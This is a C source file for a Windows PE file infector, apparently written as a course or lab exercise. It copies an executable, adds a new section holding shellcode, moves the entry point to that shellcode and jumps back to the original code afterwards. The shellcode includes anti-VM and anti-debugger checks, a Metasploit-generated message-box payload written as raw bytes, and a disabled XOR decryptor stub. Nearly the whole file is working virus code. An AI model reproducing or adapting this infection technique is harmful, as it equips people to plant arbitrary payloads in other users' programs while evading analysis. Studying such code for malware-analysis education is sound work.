#include "mapfile.h"
#include "pefile.h"

VOID SHELLCODE()
{
    __asm__(
        "_Decryptor:"
        "nop;");
    // "lea _VirusBody, %esi;"
    // "mov $500, %eax;"
    // "Decryptloop:"
    // "xorb $0xff, (%esi);"
    // "inc %esi;"
    // "dec %eax;"
    // "jnz Decryptloop;");

    // Check VM: Calling CPUID with eax = 1 and check 31st bit of ecx, vm is 1
    __asm__(
        "_VirusBody:"
        "xor %eax, %eax;"
        "inc %eax;"
        "cpuid;"
        "bt $0x1f, %ecx;"
        "jc _ReturnEntryPoint;");

    // Check Hypervisor Brand: Calling CPUID with eax = 0x40000000 and check ecx, edx
    __asm__(
        "xor %eax, %eax;"
        "mov $0x40000000, %eax;"
        "cpuid;"
        "cmp $0x4D566572, %ecx;"
        "jne CheckDebug;"
        "cmp $0x65726177, %edx;"
        "je _ReturnEntryPoint;");

    // Check debug: PEB.BeingDebugged
    __asm__(
        "CheckDebug:"
        "xor %ebx, %ebx;"
        "mov %fs:0x30, %ebx;"
        "xor %eax, %eax;"
        "movb 2(%ebx), %al;"
        "cmp $1, %eax;"
        "je _ReturnEntryPoint;");

    // Shellcode messagebox generate by Metasploit
    __asm__(
        "ShowMessageBox:"
        ".byte 0xd9;.byte 0xeb;.byte 0x9b;.byte 0xd9;.byte 0x74;.byte 0x24;.byte 0xf4;.byte 0x31;.byte 0xd2;.byte 0xb2;.byte 0x77;.byte 0x31;.byte 0xc9;"
        ".byte 0x64;.byte 0x8b;.byte 0x71;.byte 0x30;.byte 0x8b;.byte 0x76;.byte 0x0c;.byte 0x8b;.byte 0x76;.byte 0x1c;.byte 0x8b;.byte 0x46;.byte 0x08;"
        ".byte 0x8b;.byte 0x7e;.byte 0x20;.byte 0x8b;.byte 0x36;.byte 0x38;.byte 0x4f;.byte 0x18;.byte 0x75;.byte 0xf3;.byte 0x59;.byte 0x01;.byte 0xd1;"
        ".byte 0xff;.byte 0xe1;.byte 0x60;.byte 0x8b;.byte 0x6c;.byte 0x24;.byte 0x24;.byte 0x8b;.byte 0x45;.byte 0x3c;.byte 0x8b;.byte 0x54;.byte 0x28;"
        ".byte 0x78;.byte 0x01;.byte 0xea;.byte 0x8b;.byte 0x4a;.byte 0x18;.byte 0x8b;.byte 0x5a;.byte 0x20;.byte 0x01;.byte 0xeb;.byte 0xe3;.byte 0x34;"
        ".byte 0x49;.byte 0x8b;.byte 0x34;.byte 0x8b;.byte 0x01;.byte 0xee;.byte 0x31;.byte 0xff;.byte 0x31;.byte 0xc0;.byte 0xfc;.byte 0xac;.byte 0x84;"
        ".byte 0xc0;.byte 0x74;.byte 0x07;.byte 0xc1;.byte 0xcf;.byte 0x0d;.byte 0x01;.byte 0xc7;.byte 0xeb;.byte 0xf4;.byte 0x3b;.byte 0x7c;.byte 0x24;"
        ".byte 0x28;.byte 0x75;.byte 0xe1;.byte 0x8b;.byte 0x5a;.byte 0x24;.byte 0x01;.byte 0xeb;.byte 0x66;.byte 0x8b;.byte 0x0c;.byte 0x4b;.byte 0x8b;"
        ".byte 0x5a;.byte 0x1c;.byte 0x01;.byte 0xeb;.byte 0x8b;.byte 0x04;.byte 0x8b;.byte 0x01;.byte 0xe8;.byte 0x89;.byte 0x44;.byte 0x24;.byte 0x1c;"
        ".byte 0x61;.byte 0xc3;.byte 0xb2;.byte 0x08;.byte 0x29;.byte 0xd4;.byte 0x89;.byte 0xe5;.byte 0x89;.byte 0xc2;.byte 0x68;.byte 0x8e;.byte 0x4e;"
        ".byte 0x0e;.byte 0xec;.byte 0x52;.byte 0xe8;.byte 0x9f;.byte 0xff;.byte 0xff;.byte 0xff;.byte 0x89;.byte 0x45;.byte 0x04;.byte 0xbb;.byte 0x7e;"
        ".byte 0xd8;.byte 0xe2;.byte 0x73;.byte 0x87;.byte 0x1c;.byte 0x24;.byte 0x52;.byte 0xe8;.byte 0x8e;.byte 0xff;.byte 0xff;.byte 0xff;.byte 0x89;"
        ".byte 0x45;.byte 0x08;.byte 0x68;.byte 0x6c;.byte 0x6c;.byte 0x20;.byte 0x41;.byte 0x68;.byte 0x33;.byte 0x32;.byte 0x2e;.byte 0x64;.byte 0x68;"
        ".byte 0x75;.byte 0x73;.byte 0x65;.byte 0x72;.byte 0x30;.byte 0xdb;.byte 0x88;.byte 0x5c;.byte 0x24;.byte 0x0a;.byte 0x89;.byte 0xe6;.byte 0x56;"
        ".byte 0xff;.byte 0x55;.byte 0x04;.byte 0x89;.byte 0xc2;.byte 0x50;.byte 0xbb;.byte 0xa8;.byte 0xa2;.byte 0x4d;.byte 0xbc;.byte 0x87;.byte 0x1c;"
        ".byte 0x24;.byte 0x52;.byte 0xe8;.byte 0x5f;.byte 0xff;.byte 0xff;.byte 0xff;.byte 0x68;.byte 0x6f;.byte 0x78;.byte 0x58;.byte 0x20;.byte 0x68;"
        ".byte 0x61;.byte 0x67;.byte 0x65;.byte 0x42;.byte 0x68;.byte 0x4d;.byte 0x65;.byte 0x73;.byte 0x73;.byte 0x31;.byte 0xdb;.byte 0x88;.byte 0x5c;"
        ".byte 0x24;.byte 0x0a;.byte 0x89;.byte 0xe3;.byte 0x68;.byte 0x33;.byte 0x58;.byte 0x20;.byte 0x20;.byte 0x68;.byte 0x32;.byte 0x30;.byte 0x32;"
        ".byte 0x39;.byte 0x68;.byte 0x5f;.byte 0x31;.byte 0x37;.byte 0x35;.byte 0x68;.byte 0x30;.byte 0x34;.byte 0x34;.byte 0x34;.byte 0x68;.byte 0x31;"
        ".byte 0x37;.byte 0x35;.byte 0x32;.byte 0x68;.byte 0x20;.byte 0x62;.byte 0x79;.byte 0x20;.byte 0x68;.byte 0x63;.byte 0x74;.byte 0x65;.byte 0x64;"
        ".byte 0x68;.byte 0x49;.byte 0x6e;.byte 0x66;.byte 0x65;.byte 0x31;.byte 0xc9;.byte 0x88;.byte 0x4c;.byte 0x24;.byte 0x1d;.byte 0x89;.byte 0xe1;"
        ".byte 0x31;.byte 0xd2;.byte 0x52;.byte 0x53;.byte 0x51;.byte 0x52;.byte 0xff;.byte 0xd0;"
        "_ReturnEntryPoint:");
}

int main(int argc, char *argv[])
{
    if (argc < 2)
    {
        printf("Usage: peinfection <path>\n");
        return 1;
    }

    HANDLE hFile, hFileMapping;
    DWORD dwFileSize, dwFileSizeHight, dwSectionAlignment, dwFileAlignment;
    WORD wNumnberOfSections;
    PBYTE pMapView;
    PEFILE pe;

    // Copy to new file
    FILE *pFile = fopen(argv[1], "rb");
    CHAR pNewFilename[20];
    strcpy(pNewFilename, argv[1]);
    pNewFilename[strlen(pNewFilename) - 4] = '\0';
    strcat(pNewFilename, "-mod.exe");
    CopyFile(argv[1], pNewFilename, 0);
    fclose(pFile);

    // Open File handle
    hFile = CreateFile(pNewFilename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[ERROR] Can't open file");
        return 1;
    }

    // Get file size
    dwFileSize = GetFileSize(hFile, &dwFileSizeHight);
    // Mapping file to pMapView
    pMapView = MappingReadOnly(&hFile, &hFileMapping);
    // Read PE Headers
    if (ParsePEHeader(pMapView, &pe) == 1)
    {
        printf("[OK] Read headers\n");
    }

    // Get number of sections, section alignment, file alignment
    wNumnberOfSections = pe.pNTHeaders->FileHeader.NumberOfSections;
    dwSectionAlignment = pe.pNTHeaders->OptionalHeader.SectionAlignment;
    dwFileAlignment = pe.pNTHeaders->OptionalHeader.FileAlignment;

    Unmap(&hFileMapping, pMapView);

    // Mapping file with new size
    DWORD dwNewSize = Align(dwFileSize + VIRTUAL_SIZE, dwFileAlignment);
    pMapView = MappingWrite(&hFile, &hFileMapping, dwNewSize);
    ParsePEHeader(pMapView, &pe);

    // Add Empty section
    DWORD dwNewSectionRawOffset = AddEmptySection(&pe, wNumnberOfSections, dwSectionAlignment, pMapView);
    printf("[OK] Added new section (0x%02x)\n", dwNewSectionRawOffset);

    // Add Shellcode to new section
    extern const char Decryptor[];
    extern const char VirusBody[];
    extern const char ReturnEntryPoint[];

    // Get size of shellcode
    DWORD dwDecryptorShellcodeSize = (DWORD)VirusBody - (DWORD)Decryptor;
    DWORD dwMessageboxShellcodeSize = (DWORD)ReturnEntryPoint - (DWORD)VirusBody;
    DWORD dwShellcodeSize = dwDecryptorShellcodeSize + dwMessageboxShellcodeSize;

    // Get decryptor shellcode
    PBYTE pDecryptorShellcode = (PBYTE)malloc(dwDecryptorShellcodeSize * sizeof(BYTE));
    memcpy(pDecryptorShellcode, (PBYTE)Decryptor, dwDecryptorShellcodeSize);

    // Get Messagebox shellcode
    PBYTE pMessageboxShellcode = (PBYTE)malloc(dwMessageboxShellcodeSize * sizeof(BYTE));
    memcpy(pMessageboxShellcode, (PBYTE)VirusBody, dwMessageboxShellcodeSize);

    // Encryptor
    // for (int i = 0; i < 500; i++)
    // {
    //     pMessageboxShellcode[i] ^= 0xff;
    // }

    // Add shellcode to new section
    memcpy(pMapView + dwNewSectionRawOffset, pDecryptorShellcode, dwDecryptorShellcodeSize);
    memcpy(pMapView + dwNewSectionRawOffset + dwDecryptorShellcodeSize, pMessageboxShellcode, dwMessageboxShellcodeSize);
    printf("[OK] Infected code to new section (%d bytes)\n", dwShellcodeSize);

    // Set new address of entryPoint
    PIMAGE_SECTION_HEADER pNewSectionHeader = &pe.pFirstSectionHeader[wNumnberOfSections];

    DWORD dwOldEntryPoint = pe.pNTHeaders->OptionalHeader.AddressOfEntryPoint;
    pe.pNTHeaders->OptionalHeader.AddressOfEntryPoint = pNewSectionHeader->VirtualAddress;
    printf("[OK] Set to new Entry Point: 0x%02x\n", pe.pNTHeaders->OptionalHeader.AddressOfEntryPoint);

    // Get and set RA to jump to old entry point
    DWORD dwCurrentOffset = dwOldEntryPoint - (pNewSectionHeader->VirtualAddress + dwShellcodeSize + 5);
    PBYTE pRAToEntryPoint = (PBYTE)malloc(5 * sizeof(BYTE));
    pRAToEntryPoint[0] = 0xe9;
    memcpy(pRAToEntryPoint + 1, &dwCurrentOffset, 4);
    memcpy(pMapView + dwNewSectionRawOffset + dwShellcodeSize, pRAToEntryPoint, 5);

    printf("[OK] Infected\n");

    Unmap(&hFileMapping, pMapView);
    CloseHandle(hFile);
    return 0;
}